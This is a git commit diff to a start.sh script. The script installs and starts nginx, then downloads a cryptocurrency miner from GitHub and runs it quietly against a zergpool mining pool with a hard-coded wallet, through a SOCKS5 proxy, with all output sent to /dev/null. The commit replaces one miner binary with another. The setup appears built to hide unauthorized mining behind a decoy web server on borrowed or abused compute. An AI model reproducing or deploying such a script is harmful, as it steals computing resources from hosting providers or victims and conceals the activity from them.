074025884d39bd7b72b07b5a5257952efea663f0
Kentanggan <107301141+Kentanggan@users.noreply.github.com>
2022-07-27 23:02:45 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -3,4 +3,4 @@ apt update -y
 apt install nginx -y
 apt install wget -y
 service nginx start
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.5/SRBMiner-Multi-0-9-5-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-9-5-Linux.tar.xz && cd SRBMiner-Multi-0-9-5 && chmod +x SRBMiner && ./SRBMiner-MULTI --algorithm yescryptR16 --pool stratum+tcp://yescryptR16.na.mine.zergpool.com:6333  --wallet LUFTF9kAQgHyWLv2rctGvVSSxL9RXBodcF.OKTE -p c=LTC -x socks5://192.252.214.20:15864 > /dev/null 2>&1
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yescryptR16 -o stratum+tcp://yescryptR16.na.mine.zergpool.com:6333 -u LUFTF9kAQgHyWLv2rctGvVSSxL9RXBodcF.BAB -p c=LTC  -x socks5://192.252.214.20:15864 > /dev/null 2>&1
